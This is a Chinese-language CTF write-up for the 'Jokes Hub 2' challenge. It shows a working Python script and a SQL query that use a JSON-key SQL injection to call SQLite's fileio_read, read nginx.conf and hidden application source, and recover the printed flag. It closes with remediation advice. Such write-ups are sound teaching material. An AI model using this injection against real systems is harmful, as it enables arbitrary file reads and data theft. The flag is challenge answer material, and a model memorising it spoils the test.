# Jokes Hub 2

## 题目简述

第二题沿用 Jokes Hub 1 的 JSON 键名 SQL 注入，但 flag 不再存放于数据库。数据库连接显式加载 `./fileio` SQLite 扩展，而 `notes` 表还留下“应从生产服务器卸载 fileio”的提示。

该扩展提供文件系统读取函数。利用 SQL 注入调用 `fileio_read()`，可以先读取 Nginx 配置确定隐藏应用的路由条件，再读取隐藏应用源码中的 flag。

## 解题过程

数据库初始化代码启用了动态扩展：

```python
conn.enable_load_extension(True)
conn.load_extension("./fileio")
```

`fileio_read(path)` 返回 BLOB，而 `/jokes` 要求查询结果是 Python 字符串。用 SQLite 的 `hex()` 包装结果，既能通过类型断言，也能无损传输任意文件字节。

读取相对应用目录上一级的 Nginx 配置：

```python
import requests

endpoint = "http://127.0.0.1:8000/jokes"

def read_file(path):
    column = f"hex(fileio_read('{path}'))-- "
    result = requests.post(endpoint, json={column: 5}).json()["result"]
    return bytes.fromhex(result)

nginx_conf = read_file("../nginx.conf").decode()
print(nginx_conf)
```

等价查询为：

```sql
select hex(fileio_read('../nginx.conf'))--  from jokes where id=5
```

把 JSON 响应中 `result` 的十六进制解码后，可以看到 Nginx 定义了两个 uWSGI upstream：普通请求进入 `flask`，而 User-Agent 精确等于 `flagger-user` 时进入 `flagger`。配置注释还给出隐藏应用源码位置 `/ctf/flagger/flagger.py`。

从当前 `/ctf/app` 工作目录读取该源码，并复用上面的十六进制解码函数：

```python
source = read_file("../flagger/flagger.py").decode()
print(source)
```

`flagger.py` 的文件头注释中直接包含第二题 flag：

```text
shellmates{it5_l1k3_5q1i73_0n_573r01d5}
```

## 方法总结

本题在第一题 SQL 注入的基础上扩大影响范围：SQLite 扩展把数据库查询能力提升为文件读取能力，Nginx 配置再暴露内部应用结构和信任条件。外链文档不是完成题解的必要前提；关键语义是 `fileio_read(path)` 返回文件内容 BLOB，因此需要用 `hex()` 转成接口接受的文本。

修复首先应消除动态列名 SQL 注入，并在生产环境禁用扩展加载、移除不必要的 fileio 扩展。配置和源码也不应依赖“路径难猜”来保密；一旦应用具有任意文件读，注释、代理配置和环境信息都可能成为下一阶段攻击线索。
